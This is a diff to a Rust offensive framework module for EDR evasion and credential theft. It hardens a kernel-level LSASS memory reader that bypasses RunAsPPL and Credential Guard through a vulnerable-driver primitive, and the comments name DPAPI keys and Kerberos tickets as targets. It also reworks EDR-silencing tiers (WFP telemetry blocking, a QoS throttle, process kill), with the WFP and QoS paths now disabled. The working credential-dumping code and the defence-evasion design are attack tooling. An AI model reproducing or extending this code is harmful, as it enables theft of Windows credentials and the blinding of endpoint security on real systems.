@@ -1,15 +1,24 @@
 //! Network + credential + EDR-neutralization kits (P2.2 §2.4/§2.5/§4).
 //!
 //! These three are more operator-orchestrated than the EPROCESS/callback kits:
-//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — adds WFP
-//!   filter rules that drop the EDR's outbound telemetry. Leaves Event ID
-//!   5447 + packet-drop traces (documented OPSEC cost).
+//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — would add WFP
+//!   filter rules that drop the EDR's outbound telemetry. **STATUS: explicitly
+//!   dead** — the per-PID block filter cannot be populated (WFP has no PID
+//!   condition; the correct `FWPM_CONDITION_ALE_APP_ID` needs pid→image-path
+//!   resolution, not wired), so the install path always returns `Err` rather
+//!   than installing a zero-condition rule that blocks ALL outbound IPv4.
+//!   Only the rule-shape logic (`rules_for`) is live.
 //! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
 //!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
-//!   (CR3 switch + VA read); real page walk + the read loop.
+//!   (page walk + read loop). **Address-space contract:** requires a
+//!   *physical*-addressing `KernelRw` (see [`KernelRwAddressSpace`]); the
+//!   1 MiB image-base window is sparse-tolerant (unmapped pages are skipped)
+//!   but does NOT cover the heap-resident credential regions.
 //! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (kernel
 //!   ZwTerminateProcess, bypasses PPL), Freeze (user-mode WerFaultSecure coma),
-//!   Choke (EDRChoker QoS throttle, lowest noise).
+//!   Choke (QoS throttle). **STATUS: Choke refuses** — the per-process QoS
+//!   filter cannot be populated without AppId/image-path resolution, so it
+//!   returns a clear error instead of throttling the operator's own process.
 //!
 //! All unit-tested where the algorithm is pure; the user-mode tiers are
 //! framework (operator wires the Win32 calls at link time).
@@ -18,19 +27,88 @@ use crate::offsets::EprocessOffsets;
 use crate::pagewalk::PhysRead;
 use crate::persistence::ProcessHider;
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
-use alloc::vec::Vec;
 #[cfg(target_os = "windows")]
 use alloc::format;
+use alloc::vec::Vec;
 
-/// Adapter: read physical memory via a `KernelRw` (which reads physical
-/// addresses directly through the BYOVD driver). Implements `PhysRead` so
-/// `pagewalk::translate_va` can walk page tables using the driver.
+// ---- KernelRw address-space contract (kernelsdk-2-1) -----------------------
+//
+// `KernelRw::kread/kwrite` (lib.rs) documents its addresses as kernel
+// **virtual** addresses — that is the base contract every impl satisfies
+// (`ByovdDriver`/RtCore64, `LivingOffDefender`, `VaKernelRw`, …).
+//
+// The CredKit page-walk path below ([`KrwPhysRead`] + [`KernelLsassReader::read_process_mem`])
+// additionally needs a `KernelRw` that interprets addresses as **physical**:
+// the DTB and every page-table entry the walk touches are physical addresses.
+// That is an EXPLICIT extension contract. Mixing the two spaces silently
+// reads unrelated memory — a VA fed to a physical-mode driver maps RAM at the
+// VA's bit pattern; a PA fed to a VA-based driver faults or reads garbage.
+// The marker + validators below make the space explicit and catch the mix-up
+// cheaply at the call boundary (see [`is_plausible_phys_address`] and
+// [`is_plausible_kernel_va`]).
+
+/// The address space [`KernelRw::kread`]/[`KernelRw::kwrite`] interpret their
+/// `kaddr` argument in.
+///
+/// The base `KernelRw` contract is [`Self::Virtual`]. [`Self::Physical`] is
+/// the extension contract required by the CredKit page-walk path — impls that
+/// advertise it (or operators feeding one in) MUST NOT be mixed with
+/// virtual-addressing call sites.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub enum KernelRwAddressSpace {
+    /// Kernel **virtual** address — the base `KernelRw` contract.
+    Virtual,
+    /// **Physical** address — the extension contract required by
+    /// [`KrwPhysRead`] / [`KernelLsassReader::read_process_mem`].
+    Physical,
+}
+
+/// True when `pa` can plausibly be a physical address on x64.
+///
+/// Physical addresses never set bit 47: real RAM is bounded by 2^46 (64 TiB)
+/// today (architectural ceiling 2^52), while canonical kernel VAs
+/// (`0xFFFF_8000_…`) and user VAs (`0x0000_8000_…`) both set bit 47. Treating
+/// a virtual address as physical therefore fails this check cheaply instead of
+/// silently reading unrelated memory. This is a cheap heuristic, not a proof:
+/// a corrupted page-table entry can still produce a low-bit pattern.
+pub fn is_plausible_phys_address(pa: u64) -> bool {
+    pa & (1 << 47) == 0
+}
+
+/// True when `va` is a canonical kernel virtual address (x64).
+///
+/// 48-bit canonical addresses are either user (`0x0000…`–`0x0000_7FFF_FFFF_FFFF`)
+/// or kernel (`0xFFFF_8000_0000_0000`–`0xFFFF_FFFF_FFFF_FFFF`); everything
+/// between is non-canonical. Feeding a physical address (typically < 2^46) or
+/// a user VA into a VA-based `KernelRw` fails this check cheaply. Used by
+/// `win::va_rw::VaKernelRw` (Windows-only).
+pub fn is_plausible_kernel_va(va: u64) -> bool {
+    va >= 0xFFFF_8000_0000_0000
+}
+
+/// Adapter: read **physical** memory via a `KernelRw` that interprets
+/// addresses as **physical** — the [`KernelRwAddressSpace::Physical`]
+/// extension contract, NOT the base VA contract (see the address-space
+/// section above). Implements `PhysRead` so `pagewalk::translate_va` can walk
+/// page tables using the driver.
+///
+/// Runtime guard: every address is validated with
+/// [`is_plausible_phys_address`] before it reaches the driver, so a
+/// virtual-looking address (the classic VA/PA mix-up) fails with a clear
+/// error instead of silently reading unrelated memory.
 struct KrwPhysRead<'a> {
     krw: &'a dyn KernelRw,
 }
 
 impl<'a> PhysRead for KrwPhysRead<'a> {
     fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), crate::pagewalk::PhysReadError> {
+        if !is_plausible_phys_address(pa) {
+            // A virtual-looking address was fed to a physical read: the
+            // wrapped KernelRw (or a DTB-derived table base) is not
+            // physical-addressing. PhysReadError::Overflow = "physical
+            // address out of range" — the closest existing variant.
+            return Err(crate::pagewalk::PhysReadError::Overflow);
+        }
         self.krw
             .kread(pa as usize, dst)
             .map_err(|_| crate::pagewalk::PhysReadError::Ioctl)
@@ -39,17 +117,25 @@ impl<'a> PhysRead for KrwPhysRead<'a> {
 
 // ---- §2.4 WfpKit ----------------------------------------------------------
 
-/// User-mode EDR silencer: adds Windows Filtering Platform rules that block
-/// the EDR's PIDs from sending telemetry. Admin-only, **no driver** — the
-/// lowest-friction option, at the cost of Event ID 5447 (filter add) +
+/// User-mode EDR silencer: would add Windows Filtering Platform rules that
+/// block the EDR's PIDs from sending telemetry. Admin-only, **no driver** —
+/// the lowest-friction option, at the cost of Event ID 5447 (filter add) +
 /// packet-drop traces in the WFP event log. The kernel-tier alternative
 /// (overwriting the WFP callout) needs a KernelRw and is lower noise but
 /// higher risk.
 ///
-/// This is the framework: the operator binary binds `FwpmEngineOpen0` /
-/// `FwpmFilterAdd0` via the `windows` crate or FFI at link time and feeds the
-/// rule template here. The rule-shape logic (match EDR PID → block outbound
-/// on the telemetry ports/IPs) is real; the FFI binding is the operator's.
+/// **STATUS: explicitly dead (kernelsdk-2-3).** The install path
+/// (`silence_edr` → `wfp_open_silence_session` → `block_outbound_for_pid`)
+/// ALWAYS returns `Err`: WFP has no PID filter condition, and the correct
+/// `FWPM_CONDITION_ALE_APP_ID` condition needs pid→image-path resolution that
+/// is not wired. The old zero-condition filter would block ALL outbound IPv4
+/// (cutting the host's network), so the code refuses instead — there is
+/// deliberately no working install path. Only the rule-shape logic
+/// (`rules_for`) is live and tested.
+///
+/// The framework contract still holds: the operator binary binds
+/// `FwpmEngineOpen0` / `FwpmFilterAdd0` and feeds the rule template here once
+/// image-path resolution lands.
 pub struct UserModeEdrSilencer;
 
 /// A WFP filter rule template: drop traffic from `pid` matching `protocol`
@@ -341,8 +427,14 @@ impl FwpmFilter0 {
 /// Kernel-mode LSASS reader: reads LSASS process memory directly via the
 /// KernelRw primitive (CR3 switch + VA walk), bypassing RunAsPPL + Credential
 /// Guard. The user-mode Nyx `hashdump` reads the SAM hive; this is its
-/// kernel-tier upgrade that also yields in-memory credentials (cached DPAPI,
-/// Kerberos tickets).
+/// kernel-tier upgrade.
+///
+/// **Coverage (kernelsdk-2-2):** the dump reads a 1 MiB window at the image
+/// base, sparse-tolerant (unmapped pages are zero-filled, not fatal). The
+/// heap-resident credential regions (cached DPAPI, Kerberos tickets) are NOT
+/// inside that window — reading them needs additional
+/// [`KernelLsassReader::read_process_mem_skip_unmapped`] calls at their
+/// resolved addresses.
 ///
 /// **Algorithm:** to read LSASS memory from the kernel you must
 /// switch CR3 to LSASS's DTB (directory base), read the target VAs, restore
@@ -420,15 +512,61 @@ impl KernelLsassReader {
     /// The CR3 switch is the dangerous part: between writing CR3 and reading,
     /// the *current* process's address space is wrong — so the read must use
     /// physical addressing or a kernel-space VA that's global. The page walk
-    /// here uses KernelRw's physical read to translate VAs via the DTB (the
+    /// here uses [`KrwPhysRead`] to translate VAs via the target's DTB (the
     /// real impl does a 4-level page-table walk from the DTB to physical,
     /// then reads physical). That walk is the bulk of the work; this is the
     /// orchestration shell.
+    ///
+    /// ## Address-space contract (kernelsdk-2-1)
+    /// This function reads the target's EPROCESS DTB with a virtual-address
+    /// `kread`, then walks + reads page tables and payload through physical
+    /// addresses. It therefore requires a `KernelRw` whose `kread` interprets
+    /// addresses as **physical** (see [`KernelRwAddressSpace::Physical`]) —
+    /// the base VA-based impls (RtCore64 `ByovdDriver`, `LivingOffDefender`,
+    /// `VaKernelRw`) fail the walk with a clear error, not garbage. Every
+    /// physical address is validated with [`is_plausible_phys_address`]
+    /// before use, so a VA/PA mix-up errors out instead of silently returning
+    /// unrelated bytes.
+    ///
+    /// Strict: ANY unmapped page aborts the whole read (use
+    /// [`Self::read_process_mem_skip_unmapped`] for sparse regions).
     pub fn read_process_mem(
         krw: &dyn KernelRw,
         eprocess_kva: usize,
         vaddr: usize,
         len: usize,
+    ) -> Result<Vec<u8>, KitError> {
+        Self::read_process_mem_impl(krw, eprocess_kva, vaddr, len, false)
+    }
+
+    /// Like [`Self::read_process_mem`], but **skips non-present pages**: any
+    /// page whose page-table walk hits a not-present level is zero-filled and
+    /// the read continues. A sparse VA range (e.g. the 1 MiB window at an
+    /// image base, with gaps between sections and beyond the last section)
+    /// therefore returns a full-size buffer instead of aborting the whole
+    /// read on the first unmapped page. Real I/O failures (driver IOCTL
+    /// errors) still abort — only *unmapped* pages are skipped.
+    ///
+    /// This is the variant `dump_lsass` uses; [`Self::read_process_mem`] stays
+    /// strict for callers that need integrity (e.g. the PEB `ImageBaseAddress`
+    /// probe, which must fail if the PEB page is unmapped).
+    pub fn read_process_mem_skip_unmapped(
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        vaddr: usize,
+        len: usize,
+    ) -> Result<Vec<u8>, KitError> {
+        Self::read_process_mem_impl(krw, eprocess_kva, vaddr, len, true)
+    }
+
+    /// Shared loop for [`Self::read_process_mem`] and
+    /// [`Self::read_process_mem_skip_unmapped`].
+    fn read_process_mem_impl(
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        vaddr: usize,
+        len: usize,
+        skip_unmapped: bool,
     ) -> Result<Vec<u8>, KitError> {
         // 1. Read the target's DTB: kread_u64(eprocess + DIRECTORY_TABLE_BASE).
         let dtb = krw
@@ -437,8 +575,18 @@ impl KernelLsassReader {
         if dtb == 0 {
             return Err(KitError::UnsupportedPosture("target DTB is zero"));
         }
-        // 2. Wrap the KernelRw as a PhysRead adapter — the driver reads physical
-        //    memory; pagewalk::translate_va uses it to walk the 4-level table.
+        // A DTB must be a physical address (the PML4 base). A virtual-looking
+        // DTB means the EPROCESS read went through a physical-addressing impl
+        // (or the EPROCESS KVA was mis-translated) — refuse rather than walk
+        // junk page tables.
+        if !is_plausible_phys_address(dtb) {
+            return Err(KitError::UnsupportedPosture(
+                "target DTB is not a physical address — read_process_mem requires a \
+                 physical-addressing KernelRw for the page-walk reads (KernelRwAddressSpace)",
+            ));
+        }
+        // 2. Wrap the KernelRw as a PhysRead adapter — every physical read is
+        //    validated by is_plausible_phys_address inside read_phys.
         let reader = KrwPhysRead { krw };
         // 3. Read `len` bytes from `vaddr`, page-boundary aware.
         let mut out = Vec::with_capacity(len);
@@ -448,10 +596,41 @@ impl KernelLsassReader {
             let page_off = (cur_va & 0xFFF) as usize;
             let bytes_in_page = 0x1000 - page_off;
             let chunk = remaining.min(bytes_in_page);
-            let pa = crate::pagewalk::translate_va(&reader, dtb, cur_va)
-                .map_err(|e| KitError::Other(alloc::format!("page walk: {:?}", e)))?;
+            let pa = match crate::pagewalk::translate_va(&reader, dtb, cur_va) {
+                Ok(pa) => pa,
+                Err(e) if skip_unmapped => match e {
+                    // Unmapped page: zero-fill this chunk and continue. The
+                    // dump must not abort on a sparse region — gaps between
+                    // image sections are expected.
+                    crate::pagewalk::PhysReadError::NotPresent { .. } => {
+                        out.resize(out.len() + chunk, 0u8);
+                        cur_va += chunk as u64;
+                        remaining -= chunk;
+                        continue;
+                    }
+                    // Real I/O failure (driver IOCTL, address overflow): still
+                    // abort — only unmapped pages are skipped.
+                    other => {
+                        return Err(KitError::Other(alloc::format!("page walk: {:?}", other)));
+                    }
+                },
+                Err(e) => {
+                    return Err(KitError::Other(alloc::format!("page walk: {:?}", e)));
+                }
+            };
+            // The walk returned a translated page — it must be a physical
+            // address. A virtual-looking PA means the KernelRw is not
+            // physical-addressing (VA/PA mix-up): refuse, don't read garbage.
+            if !is_plausible_phys_address(pa) {
+                return Err(KitError::UnsupportedPosture(
+                    "page walk returned a virtual-looking address — the KernelRw is not \
+                     physical-addressing (KernelRwAddressSpace)",
+                ));
+            }
             let mut buf = alloc::vec![0u8; chunk];
-            krw.kread(pa as usize, &mut buf).map_err(KitError::from)?;
+            reader
+                .read_phys(pa, &mut buf)
+                .map_err(|e| KitError::Other(alloc::format!("physical read: {:?}", e)))?;
             out.extend_from_slice(&buf);
             cur_va += chunk as u64;
             remaining -= chunk;
@@ -484,10 +663,13 @@ impl CredKit for KernelLsassReader {
         // the operator wraps them in a minidump envelope at the call site
         // (crates/minidump-assembler) using the base VA returned here.
         //
-        // Typical LSASS read targets (for credential extraction):
-        // - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
-        // - Kerberos credential cache (msv1_0, wdigest, tspkg)
-        // - PKINIT / Kerberos tickets
+        // COVERAGE LIMITATION (kernelsdk-2-2): this reads the 1 MiB window at
+        // the image base. The credential regions (LsaEncryptMemory / DPAPI
+        // keys, Kerberos cache — msv1_0/wdigest/tspkg, PKINIT tickets) live in
+        // the process HEAP and other VAs, NOT inside this window — this dump
+        // is the mapped image + its neighborhood, not a full-memory dump.
+        // Reading the credential regions requires additional
+        // read_process_mem_skip_unmapped calls at their resolved addresses.
         //
         // Locate the actual lsass.exe image base inside the target process
         // by reading the PEB's `ImageBaseAddress`. Reading the FAIL-soft
@@ -502,7 +684,15 @@ impl CredKit for KernelLsassReader {
                 )
             })?;
         let read_size: usize = 0x10_0000; // 1 MiB initial read
-        let bytes = Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)?;
+        // Skip non-present pages (kernelsdk-2-2): the 1 MiB window at the
+        // image base is sparse — gaps between sections and beyond the last
+        // section are unmapped. Zero-fill those instead of aborting the dump.
+        let bytes = Self::read_process_mem_skip_unmapped(
+            krw,
+            eprocess_kva,
+            user_mode_base,
+            read_size,
+        )?;
         Ok((bytes, user_mode_base as u64))
     }
 }
@@ -782,163 +972,64 @@ fn freeze_edr_coma(_pid: u32) -> Result<(), KitError> {
 // Lowest-noise option. User-mode, admin required.
 //
 // The QoS throttle is applied by opening the target process's TCP sockets
-// via the QoS2 API (qWave) or by direct pacer.sys IOCTL. We use the
-// qWave approach as it's more portable:
-// QoS2: QOSCreateHandle → QOSAddAppFilter → QOSSetFlow → set bandwidth limit.
+// via the QoS2 API (qWave) or by direct pacer.sys IOCTL. The qWave approach
+// is more portable: QOSCreateHandle → QOSAddAppFilter → QOSSetFlow with a
+// bandwidth limit of 8 bit/s = 1 byte/s — at that rate the EDR's TLS
+// handshake (typically 2-5 KB) takes 2000-5000 seconds, effectively blocking
+// all telemetry.
 //
-// Alternatively, a simpler approach uses NtSetInformationProcess with
-// ProcessNetworkQosInformation (undocumented) — but qWave is the documented path.
+// STATUS (kernelsdk-2-3): REFUSES. QoS2 binds a throttle to the target via
+// its image path (AppId) or a keyed filter config — NOT by PID — and this
+// framework has no pid→image-path resolution wired. The previous
+// implementation installed a zero-field filter with a null AppId and
+// swallowed every error, "succeeding" while actually throttling the
+// OPERATOR'S OWN process (QoS2 binds null-AppId filters to the calling
+// process). That false-success path is removed: choke_edr_qos returns a
+// clear error until filter population is wired, and a wired implementation
+// MUST propagate QOSAddAppFilter/QOSSetFlow failures (never `let _ =`).
 
-/// QoS bandwidth limit: 8 bit/s = 1 byte/s. At this rate, the EDR's TLS
-/// handshake (typically 2-5 KB) would take 2000-5000 seconds — effectively
-/// blocking all telemetry.
-#[allow(dead_code)] // used by choke_edr_qos (#[cfg(target_os = "windows")])
-const CHOKE_BANDWIDTH_BPS: u32 = 1;
+/// Validate a Choke target before any QoS work: `pid` must be a real process.
+/// PID 0 is the idle/system pseudo-PID and is never a valid throttle target.
+/// Shared by the Windows path and the non-Windows floor; host-testable.
+fn validate_choke_pid(pid: u32) -> Result<(), KitError> {
+    if pid == 0 {
+        return Err(KitError::Other(
+            "choke_edr_qos: pid 0 is not a valid throttle target".into(),
+        ));
+    }
+    Ok(())
+}
 
 /// Throttle an EDR process's network bandwidth to 8 bit/s via the Windows
 /// QoS Packet Scheduler. The EDR's TLS handshake times out and telemetry
 /// cannot be sent. Lowest-noise option — no WFP events, no packet-drop traces.
 ///
-/// Uses the QoS2 API (qwave.dll): QOSCreateHandle → QOSAddAppFilter →
-/// QOSSetFlow with QOS_NON_ADAPTIVE_FLOW + bandwidth limiter.
-///
-/// # Safety
-/// Contains raw FFI calls (QoS2 API).
+/// **STATUS: refuses (kernelsdk-2-3).** The per-process QoS filter cannot be
+/// populated in this framework: QoS2 binds by AppId/image-path, not PID, and
+/// no pid→image-path resolution is wired. The previous implementation
+/// installed a zero-field, null-AppId filter and ignored every failure —
+/// falsely reporting success while throttling the operator's OWN process
+/// (null-AppId filters bind to the calling process). That false-success path
+/// is removed; this function returns a clear error instead. A wired
+/// implementation must populate the filter for `pid` and propagate
+/// `QOSAddAppFilter`/`QOSSetFlow` failures.
 #[cfg(target_os = "windows")]
 fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
-    use core::ffi::c_void;
-
-    // FFI types for qwave.dll QoS2 API.
-    //
-    // P1-10: QOSCreateHandle's real signature is
-    //   BOOL QOSCreateHandle(_In_ PQOS_VERSION Version, _Out_ PHANDLE Handle)
-    // — TWO parameters. The old binding here wrongly declared THREE (a phantom
-    // TemplateName pointer + a bare u32 version), which would misalign the
-    // Win32 stack frame on x64 and corrupt the handle out-param. Corrected to
-    // the documented arity below.
-    #[repr(C)]
-    struct QOS_VERSION {
-        major: u32, // must be 1
-        minor: u32, // must be 0
-    }
-    type QOSCreateHandleFn = unsafe extern "system" fn(
-        *const QOS_VERSION, // Version ({1,0} = QOS_VERSION_1)
-        *mut *mut c_void,   // QosHandle (OUT)
-    ) -> i32; // BOOL
-
-    type QOSCloseHandleFn = unsafe extern "system" fn(
-        *mut c_void, // QosHandle
-    ) -> i32;
-
-    type QOSAddAppFilterFn = unsafe extern "system" fn(
-        *mut c_void,            // QosHandle
-        *const u16,             // AppId (null = apply to all flows for this process)
-        *mut QOS_FILTER_CONFIG, // FilterConfig
-    ) -> i32;
-
-    type QOSSetFlowFn = unsafe extern "system" fn(
-        *mut c_void, // QosHandle
-        *const u16,  // AppId
-        u32,         // FlowOperation (QOS_SET_FLOW = 0)
-        u32,         // FlowType (QOS_NON_ADAPTIVE_FLOW = 1)
-        u32,         // Size (size of data buffer)
-        *mut u8,     // Data
-        u32,         // Flags (0)
-        *mut u32,    // Reserved
-    ) -> i32;
-
-    // QOS_FILTER_CONFIG — simplified layout for bandwidth limiting.
-    #[repr(C)]
-    struct QOS_FILTER_CONFIG {
-        version: u32, // 1
-        num_fields: u32, // 1 (rate limit only)
-                      // followed by FILTER_FIELDS inline (we zero-init and set rate)
-    }
-
-    // Resolve qwave.dll functions.
-    let create_handle: QOSCreateHandleFn =
-        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCreateHandle") }.map_err(
-            |_| {
-                KitError::Other(
-                    "QOSCreateHandle unresolved — qwave.dll not available (EDRChoker needs QoS2)"
-                        .into(),
-                )
-            },
-        )?;
-
-    let close_handle: QOSCloseHandleFn =
-        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCloseHandle") }
-            .map_err(|_| KitError::Other("QOSCloseHandle unresolved".into()))?;
-
-    let add_filter: QOSAddAppFilterFn =
-        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSAddAppFilter") }
-            .map_err(|_| KitError::Other("QOSAddAppFilter unresolved".into()))?;
-
-    let set_flow: QOSSetFlowFn =
-        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSSetFlow") }
-            .map_err(|_| KitError::Other("QOSSetFlow unresolved".into()))?;
-
-    // 1. Create a QoS handle. QOS_VERSION {Major=1, Minor=0} is the sole
-    //    version qwave.dll's QoS2 API accepts (QOSCreateHandle, 2 params).
-    let mut qos_handle: *mut c_void = core::ptr::null_mut();
-    let version = QOS_VERSION { major: 1, minor: 0 };
-    let result = unsafe { create_handle(&version, &mut qos_handle) };
-    if result == 0 || qos_handle.is_null() {
-        return Err(KitError::Other(
-            "QOSCreateHandle failed — are you running as admin?".into(),
-        ));
-    }
-
-    // 2. AppId filter (LIMITATION — P1-10): `pid` is NOT applied here. A null
-    //    AppId attaches the throttle to ALL flows on this QoS handle, not just
-    //    the target EDR's. QoS2's real per-process binding needs the process's
-    //    image path or a QOS_FILTER_CONFIG keyed to the PID's flows; that is
-    //    not wired yet. Until it is, treat `choke_edr_qos` as a HOST-WIDE
-    //    throttle, not a surgical per-EDR one — prefer `silence_edr`/WFP for
-    //    targeted work. (`pid` is consumed below only to document this.)
-    let _ = pid;
-    let mut config = QOS_FILTER_CONFIG {
-        version: 1,
-        num_fields: 0,
-    };
-
-    // 3. Add the filter (applies to all flows on this handle).
-    let _ = unsafe {
-        add_filter(
-            qos_handle,
-            core::ptr::null(), // null AppId = apply to all
-            &mut config,
-        )
-    };
-
-    // 4. Set the bandwidth limit: QOS_SET_FLOW = 0, QOS_NON_ADAPTIVE_FLOW = 1.
-    //    The data buffer contains the rate in bytes/sec (u64 LE).
-    let rate_bytes = CHOKE_BANDWIDTH_BPS as u64;
-    let mut rate_data = rate_bytes.to_le_bytes();
-
-    let _ = unsafe {
-        set_flow(
-            qos_handle,
-            core::ptr::null(), // null AppId = apply to all
-            0,                 // QOS_SET_FLOW
-            1,                 // QOS_NON_ADAPTIVE_FLOW
-            rate_data.len() as u32,
-            rate_data.as_mut_ptr(),
-            0, // flags
-            core::ptr::null_mut(),
-        )
-    };
-
-    // 5. Close the QoS handle. The bandwidth throttle was applied by pacer.sys
-    //    and persists for the flow lifetime regardless of handle closure.
-    //    Keeping the handle open is a forensic trace (handle-table leak); we
-    //    close it here so the operator never leaks a permanent handle.
-    let _ = unsafe { close_handle(qos_handle) };
-
-    Ok(())
+    validate_choke_pid(pid)?;
+    // No QoS FFI is invoked: the filter cannot be populated, so any handle
+    // created and any flow set would be a lie (a self-throttle). Refuse
+    // loudly instead of reporting success for an action that never happened.
+    Err(KitError::UnsupportedPosture(
+        "choke_edr_qos: per-process QoS filter cannot be populated — QoS2 binds by \
+         AppId/image-path, not PID, and no path resolution is wired here; a null-AppId \
+         zero-field filter would throttle the operator's own process. Wire image-path \
+         resolution (propagating QOSAddAppFilter/QOSSetFlow failures) or use the \
+         WFP/Kill tiers.",
+    ))
 }
 #[cfg(not(target_os = "windows"))]
-fn choke_edr_qos(_pid: u32) -> Result<(), KitError> {
+fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
+    validate_choke_pid(pid)?;
     Err(KitError::UnsupportedPosture(
         "Choke (EDRChoker QoS throttle) is Windows-only",
     ))
@@ -1197,6 +1288,125 @@ mod tests {
         // UnsupportedPosture. This test verifies the platform gate.
         let result = choke_edr_qos(1234);
         assert!(matches!(result, Err(KitError::UnsupportedPosture(_))));
+    }
+
+    // ---- kernelsdk-2-1: KernelRw address-space contract ----
+
+    #[test]
+    fn address_space_marker_distinguishes_spaces() {
+        assert_ne!(
+            KernelRwAddressSpace::Virtual,
+            KernelRwAddressSpace::Physical
+        );
+        assert_eq!(KernelRwAddressSpace::Virtual, KernelRwAddressSpace::Virtual);
+    }
+
+    #[test]
+    fn phys_address_validation_rejects_virtual_addresses() {
+        // Physical range: below 2^47.
+        assert!(is_plausible_phys_address(0));
+        assert!(is_plausible_phys_address(0x10000));
+        assert!(is_plausible_phys_address(0x7FFF_FFFF_FFFF)); // 2^47 - 1, max plausible
+        // Virtual addresses (kernel + user) set bit 47 → rejected.
+        assert!(!is_plausible_phys_address(1 << 47));
+        assert!(!is_plausible_phys_address(0x0000_8000_0000_0000)); // first user VA
+        assert!(!is_plausible_phys_address(0xFFFF_8000_0000_0000)); // first kernel VA
+        assert!(!is_plausible_phys_address(0xFFFF_F800_0000_0000)); // ntoskrnl KVA
+    }
+
+    #[test]
+    fn kernel_va_validation_rejects_phys_and_user_addresses() {
+        assert!(is_plausible_kernel_va(0xFFFF_8000_0000_0000));
+        assert!(is_plausible_kernel_va(0xFFFF_F800_0000_0000));
+        assert!(is_plausible_kernel_va(u64::MAX));
+        assert!(!is_plausible_kernel_va(0x10000)); // physical address
+        assert!(!is_plausible_kernel_va(0x7FF6_0000_0000)); // user VA
+        assert!(!is_plausible_kernel_va(0x0000_7FFF_FFFF_FFFF)); // max user VA
+    }
+
+    /// Lay a 4-level page table in the mock mapping VA 0x1_0000_0000 → phys
+    /// 0x14000 (PML4 at 0x10000, PDPT at 0x11000, PD at 0x12000, PT at 0x13000).
+    fn setup_mock_page_tables(krw: &MockKrw) {
+        krw.set_u64(0x10000, 0x11000 | 0x3); // PML4[0] → PDPT
+        krw.set_u64(0x11000 + 4 * 8, 0x12000 | 0x3); // PDPT[4] → PD
+        krw.set_u64(0x12000, 0x13000 | 0x3); // PD[0] → PT
+        krw.set_u64(0x13000, 0x14000 | 0x3); // PT[0] → data page
+        krw.set_u64(0x14000, 0xDEAD_BEEF_CAFE_BABE);
+    }
+
+    #[test]
+    fn read_process_mem_reads_translated_page() {
+        let krw = MockKrw::new();
+        setup_mock_page_tables(&krw);
+        // EPROCESS at 0x5000 with a plausible DTB (PML4 base 0x10000).
+        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
+        let bytes = KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 8).unwrap();
+        let mut b = [0u8; 8];
+        b.copy_from_slice(&bytes[..8]);
+        assert_eq!(u64::from_le_bytes(b), 0xDEAD_BEEF_CAFE_BABE);
+    }
+
+    #[test]
+    fn read_process_mem_strict_aborts_on_unmapped_page() {
+        let krw = MockKrw::new();
+        setup_mock_page_tables(&krw);
+        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
+        // 0x1_0000_1000 is unmapped (PT[1] absent) → the strict read must
+        // error on the second page rather than silently returning zeros.
+        let res = KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 0x3000);
+        assert!(res.is_err());
+    }
+
+    #[test]
+    fn read_process_mem_skip_unmapped_zero_fills_missing_pages() {
+        let krw = MockKrw::new();
+        setup_mock_page_tables(&krw);
+        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
+        // Page 1 mapped, pages 2-3 unmapped → the skip variant returns the
+        // mapped bytes followed by zero-filled gaps instead of aborting the
+        // whole dump on the first unmapped page (kernelsdk-2-2).
+        let bytes =
+            KernelLsassReader::read_process_mem_skip_unmapped(&krw, 0x5000, 0x1_0000_0000, 0x3000)
+                .unwrap();
+        assert_eq!(bytes.len(), 0x3000);
+        let mut b = [0u8; 8];
+        b.copy_from_slice(&bytes[..8]);
+        assert_eq!(u64::from_le_bytes(b), 0xDEAD_BEEF_CAFE_BABE);
+        assert!(bytes[0x1000..].iter().all(|&b| b == 0));
+    }
+
+    #[test]
+    fn read_process_mem_rejects_virtual_looking_dtb() {
+        let krw = MockKrw::new();
+        // DTB = a kernel VA — the EPROCESS read went through a
+        // physical-addressing impl, or the EPROCESS KVA was mis-translated.
+        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0xFFFF_F800_0000_0000);
+        let res = KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 8);
+        assert!(matches!(res, Err(KitError::UnsupportedPosture(_))));
+    }
+
+    #[test]
+    fn read_process_mem_empty_len_is_ok() {
+        let krw = MockKrw::new();
+        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
+        assert_eq!(
+            KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 0)
+                .unwrap()
+                .len(),
+            0
+        );
+    }
+
+    // ---- kernelsdk-2-3: Choke false-success removed ----
+
+    #[test]
+    fn choke_rejects_pid_zero_and_validates_nonzero() {
+        assert!(matches!(validate_choke_pid(0), Err(KitError::Other(_))));
+        assert!(validate_choke_pid(1).is_ok());
+        assert!(validate_choke_pid(1234).is_ok());
+        // The public entry point validates the pid before anything else
+        // (on every platform).
+        assert!(choke_edr_qos(0).is_err());
     }
 
     #[test]
